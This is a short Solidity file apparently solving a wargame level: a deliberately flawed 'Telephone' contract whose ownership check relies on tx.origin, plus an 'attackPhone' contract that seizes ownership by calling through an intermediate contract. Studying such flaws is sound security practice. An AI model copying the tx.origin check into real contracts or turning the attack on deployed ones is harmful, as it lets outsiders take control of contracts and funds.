// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    

    }

}

contract attackPhone{




    function attack(address _phone) public{
        Telephone(_phone).changeOwner(address(this));
    }
}